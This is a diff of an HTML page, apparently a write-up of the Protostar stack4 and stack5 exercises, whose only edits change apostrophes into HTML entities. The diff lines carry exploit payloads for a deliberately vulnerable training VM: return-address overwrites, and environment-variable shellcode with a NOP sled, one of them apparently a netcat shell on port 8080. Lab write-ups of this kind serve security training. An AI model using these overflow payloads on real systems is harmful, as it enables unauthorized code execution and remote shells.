@@ -137,7 +137,7 @@ Stack level 0, frame at 0xbffff7d0:
 eip = 0x804841d in main (stack4/stack4.c:16); saved eip 0xb7eacc76
 source language c.
 Arglist at 0xbffff7c8, args: argc=1, argv=0xbffff874
-Locals at 0xbffff7c8, Previous frame's sp is 0xbffff7d0
+Locals at 0xbffff7c8, Previous frame&#39;s sp is 0xbffff7d0
 Saved registers:
 ebp at 0xbffff7c8, eip at 0xbffff7cc
 (gdb) x/32xw $esp
@@ -165,7 +165,7 @@ Using the offset calculated above, <code>eip</code> is redirected to the address
 
 
 <div>
-  <pre><code class='console'>$ echo -e &quot;$(perl -e &quot;print 'A'x76&quot;)\xf4\x83\x04\x08&quot; | ./stack4
+  <pre><code class='console'>$ echo -e &quot;$(perl -e &quot;print &#39;A&#39;x76&quot;)\xf4\x83\x04\x08&quot; | ./stack4
 code flow successfully changed
 Segmentation fault</code></pre>
 </div>
@@ -249,14 +249,14 @@ int 0x80</code></pre>
   <pre><code class='console'>$ export SC=$(echo -n $(~/nop 100)$(cat /home/user/shell))
 $ ~/envaddr SC
 SC is at address 0xbffffefa
-$ echo -n $(perl -e 'print &quot;\xfa\xfe\xff\xbf&quot;x25') | /opt/protostar/bin/stack5</code></pre>
+$ echo -n $(perl -e &#39;print &quot;\xfa\xfe\xff\xbf&quot;x25&#39;) | /opt/protostar/bin/stack5</code></pre>
 </div>
 
 
 <p>Nothing happened! Let&rsquo;s take a look with GDB.</p>
 
 <div>
-  <pre><code class='text'>[user@protostar:~]$ echo -n $(perl -e 'print &quot;\xfa\xfe\xff\xbf&quot;x25') &gt; /tmp/sc-shell
+  <pre><code class='text'>[user@protostar:~]$ echo -n $(perl -e &#39;print &quot;\xfa\xfe\xff\xbf&quot;x25&#39;) &gt; /tmp/sc-shell
 [user@protostar:~]$ gdb /opt/protostar/bin/stack5
 Reading symbols from /opt/protostar/bin/stack5...done.
 (gdb) run &lt; /tmp/sc-shell
@@ -280,7 +280,7 @@ Program exited normally.</code></pre>
 $ export SC=$(echo -ne $(~/nop 100)$(cat /home/user/sc-nc-8080))
 $ ~/envaddr SC
 SC is at address 0xbffffece
-$ echo -n $(perl -e 'print &quot;\xce\xfe\xff\xbf&quot;x25') | /opt/protostar/bin/stack5
+$ echo -n $(perl -e &#39;print &quot;\xce\xfe\xff\xbf&quot;x25&#39;) | /opt/protostar/bin/stack5
 &lt;waiting&gt;</code></pre>
 </div>
 
